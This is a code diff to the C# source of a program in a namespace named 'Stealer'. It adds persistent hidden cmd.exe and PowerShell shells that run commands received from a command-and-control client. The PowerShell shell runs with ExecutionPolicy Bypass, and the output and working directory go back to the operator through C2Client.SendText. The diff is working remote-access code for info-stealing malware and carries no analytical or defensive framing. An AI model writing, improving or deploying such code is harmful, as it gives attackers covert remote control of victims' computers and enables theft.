@@ -1,7 +1,10 @@
 using System;
 using System.IO;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Globalization;
+using System.Diagnostics;
 using Stealer.Collectors;
 using Stealer.Utils;
 
@@ -10,6 +13,24 @@ namespace Stealer
     class Program
     {
         private static string _clientId;
+
+        // ── Persistent shells ──────────────────────────────────────────────
+        private const string SHELL_DONE   = "==AEST_DONE==";
+        private const string SHELL_CWD    = "==AEST_CWD==";
+
+        private static Process _cmdShell;
+        private static readonly object _cmdLock = new object();
+        private static readonly StringBuilder _cmdOut = new StringBuilder();
+        private static readonly StringBuilder _cmdErr = new StringBuilder();
+        private static readonly ManualResetEventSlim _cmdReady = new ManualResetEventSlim(false);
+
+        private static Process _psShell;
+        private static readonly object _psLock = new object();
+        private static readonly StringBuilder _psOut = new StringBuilder();
+        private static readonly StringBuilder _psErr = new StringBuilder();
+        private static readonly ManualResetEventSlim _psReady = new ManualResetEventSlim(false);
+        // ──────────────────────────────────────────────────────────────────
+
         private static readonly string CrashLog = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
             "whm_crash.log");
@@ -103,14 +124,17 @@ namespace Stealer
             else if (cmdLower.StartsWith("exec_cmd:"))
             {
                 string payload = cmd.Substring("exec_cmd:".Length);
-                RunShellCommand("cmd.exe", "/c " + payload, "cmd_res");
+                RunPersistentCmd(payload);
             }
             else if (cmdLower.StartsWith("exec_ps:"))
             {
                 string payload = cmd.Substring("exec_ps:".Length);
-                RunShellCommand("powershell.exe",
-                    "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + payload.Replace("\"", "\\\"") + "\"",
-                    "ps_res");
+                RunPersistentPs(payload);
+            }
+            else if (cmdLower == "shell_reset")
+            {
+                lock (_cmdLock) { try { _cmdShell?.Kill(); } catch { } _cmdShell = null; }
+                lock (_psLock)  { try { _psShell?.Kill();  } catch { } _psShell  = null; }
             }
             else if (cmdLower == "tasklist")
             {
@@ -145,39 +169,193 @@ namespace Stealer
             }
         }
 
-        private static void RunShellCommand(string filename, string args, string responseType)
+        private static Encoding OemEnc => Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);
+
+        private static void EnsureCmdShell()
+        {
+            if (_cmdShell != null && !_cmdShell.HasExited) return;
+            try { _cmdShell?.Kill(); _cmdShell?.Dispose(); } catch { }
+
+            var psi = new ProcessStartInfo("cmd.exe")
+            {
+                UseShellExecute = false,
+                RedirectStandardInput  = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                CreateNoWindow = true,
+                StandardOutputEncoding = OemEnc,
+                StandardErrorEncoding  = OemEnc
+            };
+            _cmdShell = Process.Start(psi);
+
+            _cmdShell.OutputDataReceived += (s, e) =>
+            {
+                if (e.Data == null) return;
+                if (e.Data.TrimEnd() == SHELL_DONE) { _cmdReady.Set(); return; }
+                if (e.Data.StartsWith(SHELL_CWD))   return; // consumed by SendCmdResult
+                _cmdOut.AppendLine(e.Data);
+            };
+            _cmdShell.ErrorDataReceived += (s, e) =>
+            {
+                if (e.Data != null) _cmdErr.AppendLine(e.Data);
+            };
+            _cmdShell.BeginOutputReadLine();
+            _cmdShell.BeginErrorReadLine();
+
+            // Drain initial banner
+            _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
+            _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
+            _cmdShell.StandardInput.Flush();
+            _cmdReady.Wait(3000);
+            _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
+        }
+
+        private static void RunPersistentCmd(string payload)
         {
             Task.Run(() =>
             {
-                try
+                lock (_cmdLock)
                 {
-                    var psi = new System.Diagnostics.ProcessStartInfo
+                    try
                     {
-                        FileName = filename,
-                        Arguments = args,
-                        UseShellExecute = false,
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true,
-                        CreateNoWindow = true,
-                        StandardOutputEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage),
-                        StandardErrorEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage)
-                    };
-                    using (var p = System.Diagnostics.Process.Start(psi))
+                        EnsureCmdShell();
+                        _cmdOut.Clear(); _cmdErr.Clear(); _cmdReady.Reset();
+
+                        _cmdShell.StandardInput.WriteLine(payload);
+                        _cmdShell.StandardInput.WriteLine("echo " + SHELL_CWD + "%CD%");
+                        _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
+                        _cmdShell.StandardInput.Flush();
+
+                        bool ok = _cmdReady.Wait(15000);
+
+                        // Extract CWD from output before clearing
+                        string rawOut = _cmdOut.ToString();
+                        string cwd = "";
+                        foreach (string ln in rawOut.Split('\n'))
+                        {
+                            string t = ln.Trim();
+                            if (t.StartsWith(SHELL_CWD))
+                            {
+                                cwd = t.Substring(SHELL_CWD.Length).Trim();
+                                rawOut = rawOut.Replace(ln, "").Replace(ln.TrimEnd(), "");
+                            }
+                        }
+
+                        string stdout = rawOut.TrimEnd();
+                        string stderr = _cmdErr.ToString().TrimEnd();
+                        string result = string.IsNullOrEmpty(stderr) ? stdout
+                            : (string.IsNullOrEmpty(stdout) ? "[STDERR]\r\n" + stderr
+                            : stdout + "\r\n[STDERR]\r\n" + stderr);
+                        if (!ok) result += "\r\n[TIMEOUT]";
+
+                        SendShellResult("cmd_res", result, cwd);
+                    }
+                    catch (Exception ex)
                     {
-                        string output = p.StandardOutput.ReadToEnd();
-                        string error = p.StandardError.ReadToEnd();
-                        p.WaitForExit(10000);
-                        string result = string.IsNullOrEmpty(error) ? output : (output + "\r\n[STDERR]\r\n" + error);
-                        string escaped = result.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
-                        C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"" + escaped + "\"}");
+                        try { _cmdShell?.Kill(); } catch { } _cmdShell = null;
+                        SendShellResult("cmd_res", "[ERROR] " + ex.Message, "");
                     }
                 }
-                catch (Exception ex)
+            });
+        }
+
+        private static void EnsurePsShell()
+        {
+            if (_psShell != null && !_psShell.HasExited) return;
+            try { _psShell?.Kill(); _psShell?.Dispose(); } catch { }
+
+            var psi = new ProcessStartInfo("powershell.exe",
+                "-NoProfile -NoExit -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; $PSDefaultParameterValues['Out-File:Encoding']='utf8'\"")
+            {
+                UseShellExecute = false,
+                RedirectStandardInput  = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                CreateNoWindow = true,
+                StandardOutputEncoding = Encoding.UTF8,
+                StandardErrorEncoding  = Encoding.UTF8
+            };
+            _psShell = Process.Start(psi);
+
+            _psShell.OutputDataReceived += (s, e) =>
+            {
+                if (e.Data == null) return;
+                if (e.Data.TrimEnd() == SHELL_DONE) { _psReady.Set(); return; }
+                _psOut.AppendLine(e.Data);
+            };
+            _psShell.ErrorDataReceived += (s, e) =>
+            {
+                if (e.Data != null) _psErr.AppendLine(e.Data);
+            };
+            _psShell.BeginOutputReadLine();
+            _psShell.BeginErrorReadLine();
+
+            // Drain banner
+            _psOut.Clear(); _psErr.Clear(); _psReady.Reset();
+            _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
+            _psShell.StandardInput.Flush();
+            _psReady.Wait(5000);
+            _psOut.Clear(); _psErr.Clear(); _psReady.Reset();
+        }
+
+        private static void RunPersistentPs(string payload)
+        {
+            Task.Run(() =>
+            {
+                lock (_psLock)
                 {
-                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
-                    C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"[ERROR] " + errEsc + "\"}");
+                    try
+                    {
+                        EnsurePsShell();
+                        _psOut.Clear(); _psErr.Clear(); _psReady.Reset();
+
+                        _psShell.StandardInput.WriteLine(payload);
+                        _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
+                        _psShell.StandardInput.Flush();
+
+                        bool ok = _psReady.Wait(15000);
+
+                        string cwd = "";
+                        try
+                        {
+                            // Get CWD separately
+                            var sb2 = new StringBuilder(); var ev2 = new ManualResetEventSlim(false);
+                            DataReceivedEventHandler h = null;
+                            h = (s, e) => { if (e.Data == null) return; if (e.Data.TrimEnd() == SHELL_DONE) { ev2.Set(); return; } sb2.AppendLine(e.Data); };
+                            _psShell.OutputDataReceived += h;
+                            _psShell.StandardInput.WriteLine("(Get-Location).Path");
+                            _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
+                            _psShell.StandardInput.Flush();
+                            ev2.Wait(3000);
+                            _psShell.OutputDataReceived -= h;
+                            cwd = sb2.ToString().Trim();
+                        }
+                        catch { }
+
+                        string stdout = _psOut.ToString().TrimEnd();
+                        string stderr = _psErr.ToString().TrimEnd();
+                        string result = string.IsNullOrEmpty(stderr) ? stdout
+                            : (string.IsNullOrEmpty(stdout) ? "[STDERR]\r\n" + stderr
+                            : stdout + "\r\n[STDERR]\r\n" + stderr);
+                        if (!ok) result += "\r\n[TIMEOUT]";
+
+                        SendShellResult("ps_res", result, cwd);
+                    }
+                    catch (Exception ex)
+                    {
+                        try { _psShell?.Kill(); } catch { } _psShell = null;
+                        SendShellResult("ps_res", "[ERROR] " + ex.Message, "");
+                    }
                 }
             });
+        }
+
+        private static void SendShellResult(string type, string output, string cwd)
+        {
+            string esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"")
+                .Replace("\r", "\\r").Replace("\n", "\\n");
+            string cwdPart = string.IsNullOrEmpty(cwd) ? "" : ",\"cwd\":\"" + esc(cwd) + "\"";
+            C2Client.SendText("{\"type\":\"" + type + "\",\"output\":\"" + esc(output) + "\"" + cwdPart + "}");
         }
 
         private static void GetTaskList()
